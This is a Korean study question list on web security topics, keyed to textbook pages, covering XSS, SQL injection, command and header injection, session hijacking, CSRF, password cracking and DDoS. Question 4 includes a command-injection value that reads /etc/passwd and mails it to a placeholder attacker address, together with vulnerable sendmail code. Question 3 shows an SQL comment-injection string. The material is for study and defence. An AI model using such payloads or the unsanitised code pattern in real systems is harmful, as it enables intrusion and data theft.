## 질문 목록

### 1. 크로스 사이트 스크립팅(XSS)란 무엇인가? (270p)

### 2. SQL Injection이란 무엇인가? (276p)

### 3. `SELECT * FROM bookTBl WHERE author='우에노 센'--' and flag=1;` 에서 인젝션이 발생하는 원인을 설명하시오. (281~282p)

### 4. 다음 스크립트에서 공격자가 메일 주소 값 $adr에 `; cat /etc/passwd | mail hack@example.jp`를 보낸다면 실제 프로그램 내에서 구성되는 명령은 어떻게 해석되는지 쓰시오. (283~284p)

```php
my $adr = $q -> param('mailaddress');
open(MAIL, "| /usr/sbin/sendmail $adr");
print MAIL "From: info@example.com\n"
```

### 5. HTTP Header Injection이란 무엇인가? (284p)

### 6. 인증 기능에서 `메일 주소가 등록되어 있지 않습니다` 와 같은 에러 메시지는 왜 문제가 되는가? 그렇다면 올바른 에러 메시지는 무엇인가? (296~297p)

### 7. (응용) Session Hijack에 대해서 설명하고, XSS를 이용한 Session Hijack을 방지하기 위한 방법은 무엇인가? (299p~301p, 176p)

### 8. CSRF 공격에 대해서 설명하시오. (303p)

### 9. 암호화 된 패스워드로부터 평문을 도출하는 방법 중 무차별 대입 공격/사전 공격에 의한 유추와 레인보우 테이블에 대해서 설명하시오. (309~310p)

### 10. DDoS 공격에 대하여 설명하시오. (312~313p)
